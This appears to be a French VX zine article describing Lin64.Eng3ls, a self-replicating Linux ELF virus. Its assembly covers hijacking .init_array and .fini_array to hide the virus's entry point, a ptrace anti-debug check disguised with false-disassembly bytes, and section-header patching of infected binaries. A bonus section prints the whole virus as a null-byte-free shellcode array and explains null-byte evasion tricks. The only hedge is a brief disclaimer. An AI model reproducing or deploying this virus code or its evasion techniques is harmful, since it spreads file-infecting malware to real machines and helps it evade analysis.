                                                            ┌───────────────────────┐
                                                            ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
                                                            │ █   █ █ █ █   █       │
                                                            │ █   █ █ █ █▀▀▀▀       │
                                                            │ █   █   █ █     ▄     │
                                                            │                 ▄▄▄▄▄ │
                                                            │                 █   █ │
                                                            │                 █   █ │
                                                            │                 █▄▄▄█ │
                                                            │                 ▄   ▄ │
                                                            │                 █   █ │
                                                            │                 █   █ │
                                                            │                 █▄▄▄█ │
                                                            │                 ▄▄▄▄▄ │
                                                            │                   █   │
Lin64.Eng3ls: Qq Techniques Anti-RE Dans Un Virus Linux     │                   █   │
~ S01den & sblip                                            └───────────────────█ ──┘

Ecrit avec amour par S01den.
mail: S01den@protonmail.com

--- Introduction ---

Avec Sblip, nous avons travaillé tout un week-end sur Lin64.Eng3ls pour un événement privé. Basiquement Eng3ls est Lin64.Kropotkine[0], la méthode d'infection est toujours le même bon vieux segment PT_NOTE à PT_LOAD, mais nous avons ajouté quelques techniques d'obfuscation.

En effet, Kropotkine n'est pas du tout furtif : le point d'entrée des binaires infectés est modifié pour pointer directement vers le virus et le code viral est en clair (donc facile à analyser...).

Pour résoudre ces problèmes, nous avons fait un décrypteur/encrypteur xor oligomorphe (pas très sophistiqué je sais...) pour le corps du virus, la clé changeant dans chaque nouveau binaire infecté afin que chaque code répliqué soit différent.

Cependant, ce polymorphisme du pauvre a le grand désavantage que le code du décrypteur ne change pas.

Ainsi, sans plus de sorcellerie, un reverser comprendrait très rapidement comment le virus est crypté, et ce qu'il fait.

C'est pourquoi j'ai implémenté pour la première fois dans un de mes virus, la technique de false-disassembly polymorphique (ou simplement "faux polymorphisme") afin d'obfusquer le décrypteur.

Consultez l'article que j'ai écrit sur cette technique pour voir comment elle fonctionne et les résultats ! (en gros, tournez la page du zine)

Mais il y avait encore un problème : le point d'entrée des binaires infectés pointe directement vers le virus, ce qui n'est pas du tout furtif !
Voyons comment nous avons résolu ce problème...

--- Une technique d'obfuscation du point d'entrée du ELF ---

/!\ Cette technique ne fonctionne pas avec les binaires PIE /!\

L'Obfuscation du point d'entrée (EPO) est simplement l'action, pour un virus, de cacher l'adresse de sa première instruction.

Dans les virus non-EPO, le point d'entrée d'un programme infecté est modifié pour pointer vers le début du virus, alors que dans les virus EPO, le virus est appelé d'une autre manière, que ce soit en cachant un jump dans le code de l'hôte ou en abusant, comme ici, d'une spécificité du format du fichier exécutable.

Dans les ELF, le point d'entrée n'est pas, en fait, la première adresse exécutée lors de l'exécution du programme.

Il y a quelques routines d'initialisation de la glibc, qui au final chargent main().

Je ne vais pas expliquer en détail comment cela fonctionne, il y a déjà un papier sympa à ce sujet[1]. Gardez juste à l'esprit que nous allons détourner les sections .init_array et .fini_array, qui contiennent respectivement un pointeur vers le constructeur et un pointeur vers le destructeur du binaire.

Ainsi, l'adresse du code situé dans .init_array est exécutée avant le point d'entrée. C'est exactement le genre de chose que nous voulions!

J'ai choisi d'implémenter d'abord une petite technique anti-débugage, une vérification de ptrace pour voir si le processus actuel est tracé (donc débugué ou stracé) ou non.
Le classique "if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) exit(0);"...
Facile à contourner (patcher le virus ou mettre rax = 0 dans gdb à la comparaison)...
Donc je l'ai rendu "difficile" (pas vraiment) à détecter!

------------------------- coupez ici ------------------------------------------------
check_dbg:
    push rbp
    mov rbp, rsp

    jmp jmp_over4+2
    jmp_over4:
      db `\x41\xba` ; false disassembly
    mov rax, 101 ; sys_ptrace
    xor rdi, rdi ; PTRACE_TRACEME
    xor rsi, rsi
    xor r10, r10
    xor rdx, rdx
    inc rdx
    jmp jmp_over6+2
    jmp_over6:
      db `\xe9\x94` ; false disassembly
    syscall

    jmp jmp_over5+2
    jmp_over5:
      db `\x49\x81` ; false disassembly
    cmp rax, 0
    jge continue
    mov rax, 60
    xor rdi, rdi
    syscall

    continue:
    pop rbp
    ret
-------------------------------------------------------------------------------------

J'ai écrit quelques octets de false-disassembly (qui changent à chaque nouvelle infection) dans la routine et je l'ai fait appeler avant main() en abusant de .init_array.
Ainsi, en cas de débugage, le virus arrête son exécution, même avec un point d'arrêt sur le point d'entrée.

En ce qui concerne le virus en lui-même, je l'ai fait appeler à la fin, en abusant de .fini_array. Voici les routines que j'ai écrites pour analyser la table d'en-tête de section dans la recherche de .init_array et .fini_array, et pour les patcher.

------------------------- coupez ici ------------------------------------------------
parse_shdr:
  xor rcx, rcx
  xor rdx, rdx
  mov cx, word [rax+e_hdr.shnum]     ; rcx = # of entries in the program header table
  mov rbx, qword [rax+e_hdr.shoff]   ; rbx = offset of the program header table
  mov dx, word [rax+e_hdr.shentsize] ; rdx = size of a program header table entry

  loop_shdr:
    add rbx, rdx
    dec rcx
    cmp dword [rax+rbx+e_shdr.type], 0x0E ; 0x0F = SHT_INIT_ARRAY, the section we're 
                                          ; looking to modify to put the debugging 
                                          ; check (.init_array)
    je ctor_found
    cmp dword [rax+rbx+e_shdr.type], 0x0F ; 0x0F = SHT_FINI_ARRAY, the section we're 
                                          ; looking to modify to EPO (.fini_array)
    je dtor_found
    cmp rcx, 0
    jg loop_shdr

dtor_found:
  mov rdi, qword [rax+rbx+e_shdr.offset]
  mov [rax+rdi], r9 ; r9 holds the addr of the converted segment, the one where we
                    ; are writing the virus
  jmp write_vx

ctor_found:
  mov rdi, qword [rax+rbx+e_shdr.offset]
  add r9, 0x86 ; r9+0x86 = the addr where check_dbg begins
  mov [rax+rdi], r9
  sub r9, 0x86
  jmp loop_shdr
-------------------------------------------------------------------------------------

--- Conclusion ---

La modification du point d'entrée c'est nul, utilisez plutôt des astuces d'obfuscation du point d'entrée comme le détournement de .init_array ou de .fini_array.

Ajoutez quelques astuces anti-RE amusantes pour pimenter vos virus : une pincée de cryptage par-ci, une cuillerée de détection du débugueur par-là...

J'espère que cet article vous a plu et que vous avez appris quelque chose.

Si vous voulez aller plus loin, j'ai écrit un crackme utilisant les mêmes techniques d'anti-reverse-engineering que celles utilisées par eng3ls.

Trouvez-le à : https://crackmes.one/crackme/6049f27f33c5d42c3d016dea

--- Bonus ---

J'ai écrit une version de ce virus sans octet null.
Null-byte free code + Position Independent = shellcode \o/
Voici donc une version shellcode du virus :

unsigned char shellcode[] = 
    "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc9\x4d"
    "\x31\xc0\x49\x89\xe6\x48\x81\xc4\xe8\xc3\x11\x11\x48\x81\xec\xde"
    "\xc0\x11\x11\x49\x89\xe7\xeb\x7c\x58\x48\x2d\x87\xc1\x11\x11\x48"
    "\x05\xde\xc0\x11\x11\x50\x41\x5c\x68\xe8\xc3\x11\x11\x5e\x48\x81"
    "\xee\xde\xc0\x11\x11\x48\x81\xc6\xe8\xc3\x11\x11\x48\x81\xee\xde"
    "\xc0\x11\x11\x48\x31\xff\x6a\x07\x5a\x6a\x22\x41\x5a\x6a\x09\x58"
    "\x0f\x05\x48\x89\xc3\x56\x59\xb0\x54\x48\x31\xd2\x41\x8a\x14\x3c"
    "\x48\x81\xc7\xde\xc0\x11\x11\x48\x81\xff\x86\xc1\x11\x11\x76\x02"
    "\x30\xc2\x48\x81\xef\xde\xc0\x11\x11\x88\x14\x3b\x48\xff\xc7\xe2"
    "\xdb\x49\x89\xdf\x48\x81\xc3\x87\xc1\x11\x11\x48\x81\xeb\xde\xc0"
    "\x11\x11\xff\xe3\xe8\x7f\xff\xff\xff\x1c\xd5\x90\x5e\x57\x54\x54"
    "\x1c\xd5\x90\x5e\x57\x54\x54\x1c\xd5\x90\x54\x55\x54\x54\xbd\x6b"
    "\x56\x54\x54\x0b\xec\x56\x54\x54\x54\x1c\x65\xa2\x5b\x51\x1c\xdd"
    "\x93\xec\x8d\x54\x54\x54\x1c\xdd\xb2\xee\x54\x50\x54\x54\x5b\x51"
    "\x1c\xd7\xac\x54\x5b\xd8\xb1\x55\x54\x54\x1d\xdd\x91\x1c\x65\x8f"
    "\x1c\xdd\xb4\x1c\xd7\x94\x47\x1c\xdd\x92\xeb\x55\x54\x54\x54\x1c"
    "\x65\x9d\xde\x18\x70\x46\x07\xbc\x42\x54\x54\x54\x0f\x32\xdf\x10"
    "\x70\x44\x1c\x55\x97\x1c\x55\x90\x18\x6d\xbf\x28\x87\xbd\xf9\x55"
    "\x54\x54\x1c\xdd\xb1\x1c\xd7\xad\x5c\x21\x05\x1c\xdd\xa3\xec\x56"
    "\x54\x54\x54\xea\x56\x50\x54\x54\x5b\x51\x1c\xd7\xac\x54\x2a\x68"
    "\x1c\xdd\x97\x1c\xdd\xb2\x18\x7d\xba\xec\x50\x54\x54\x54\x5b\x51"
    "\x1d\xdd\x8c\x1c\xdf\x22\x64\xeb\x54\x54\x54\x54\xee\x52\x54\x54"
    "\x54\x19\x65\x9d\x15\xee\x55\x54\x54\x54\x1c\x65\x94\xec\x5d\x54"
    "\x54\x54\x5b\x51\xd5\x6c\x2b\x11\x18\x12\x20\x45\xec\x57\x54\x54"
    "\x54\x1c\xdd\x8b\x5b\x51\x1c\x65\x94\x1c\xdd\xb8\x97\xd4\x2c\x50"
    "\x56\x20\x56\xbf\xb3\x32\xd7\x2c\x44\x56\x20\x56\xbf\x8a\xd5\x2c"
    "\x5d\x8a\x94\xf9\x8a\x21\x53\x1c\x65\x94\x1c\xdd\xb8\x97\x1c\x65"
    "\x9d\x1c\x65\x86\x32\xdf\x1c\x6c\x1c\xdf\x0c\x74\x32\xdf\x04\x62"
    "\x1c\x55\x87\x1c\xab\x9d\xd7\x68\x4c\x50\x20\x52\x1c\xd7\xad\x54"
    "\x2b\xba\x93\x14\x5d\x8a\x94\xf9\x8a\x93\x50\x4c\x55\x54\x54\x54"
    "\x93\x10\x4c\x50\x53\x54\x54\x54\x15\xed\x54\x54\x54\x58\x1d\x55"
    "\xa5\x18\xdd\x18\x4c\x44\x1c\xdf\x28\x4c\x74\x1c\xd5\x93\x5e\x57"
    "\x54\x54\x1c\xdd\x28\x4c\x74\x1c\xdf\x28\x4c\x7c\x1c\xd5\x93\x5e"
    "\x57\x54\x54\x1c\xdd\x28\x4c\x7c\x1c\xdd\x20\x4c\x5c\x1c\x65\x9d"
    "\x1c\x65\x86\x32\xdf\x1c\x68\x1c\xdf\x0c\x7c\x32\xdf\x04\x6e\x1c"
    "\x55\x87\x1c\xab\x9d\xd7\x28\x4c\x50\x5b\x20\x52\x1c\xd7\xad\x54"
    "\x2b\xb9\x1c\xdf\x28\x4c\x4c\x18\xdd\x58\x6c\xee\x50\x54\x54\x54"
    "\x1c\xdd\x93\xec\x4e\x54\x54\x54\x5b\x51\xec\x5f\x54\x54\x54\x5b"
    "\x51\x5b\x65\x32\x61\xf9\x8a\x15\xde\x1b\x3c\x15\xdc\x13\x3c\x1c"
    "\x65\x86\x1c\x65\x8f\x15\xde\x48\x43\x15\xdc\xc8\x43\x5e\x57\x54"
    "\x54\x1c\xab\x96\x1c\xd5\xae\xfd\x54\x54\x54\x21\xbc\x15\xde\x48"
    "\x43\x64\x97\x15\xdc\xc8\x43\x5e\x57\x54\x54\x1c\xab\x96\x1c\xd5"
    "\xae\x5e\x57\x54\x54\x21\xb2\x18\xdd\x93\x18\xdd\xaa\x1c\xd5\x92"
    "\x5e\x57\x54\x54\xee\x5e\x57\x54\x54\x1c\xd7\x96\x7a\xec\x55\x54"
    "\x54\x54\x5b\x51\xec\x57\x54\x54\x54\x5b\x51\x1c\xdd\xb8\x97\xec"
    "\x55\x54\x54\x54\x1c\x65\xab\x1c\xab\x93\x3c\x5e\x0c\x0b\x0c\x1c"
    "\xdd\xb2\xee\x50\x54\x54\x54\x5b\x51\xec\x68\x54\x54\x54\x5b\x51"
    "\x1c\x65\x9d\x1c\x65\x8f\x1c\x65\x94\x1c\x65\x86\x97\x1c\xdf\x50"
    "\x70\x97\xbc\xe8\xa9\xab\xab\x7a\x54\x54";

Ne soyez pas stupide, ne répandez pas ca dans la nature.
Nous ne prenons pas la responsabilité de ce que vous faites avec.

--> deux techniques pour écrire des codes sans octet null :

1) Remplacer les instructions mov par push.
Exemple :

b809000000     mov eax, 9  ----> 6a09 push 0x9
                                 58   pop rax
2) La technique add/sub :
Parfois, les valeurs que vous ajoutez à un registre impliquent des octets null.
Vous pouvez les supprimer en ajoutant et en soustrayant une valeur inutile.
Exemple :

4881c4890300  add rsp, 0x389  ----> 4881c4e8c311  add rsp, 0x1111c3e8
          ^                         // 0x1111c3e8 = 0x389 + 0x1111c0de
                                    4881ecdec011  sub rsp, 0x1111c0de


--- Notes et références ---
[0] https://github.com/vxunderground/MalwareSourceCode
      /blob/main/VXUG/Linux.Kropotkine.asm
[1] Abusing .CTORS and .DTORS for fun 'n profit
    https://www.exploit-db.com/papers/13234

--- Source ---

- Linux.Eng3ls.asm (Voir le fichier dans txt/)
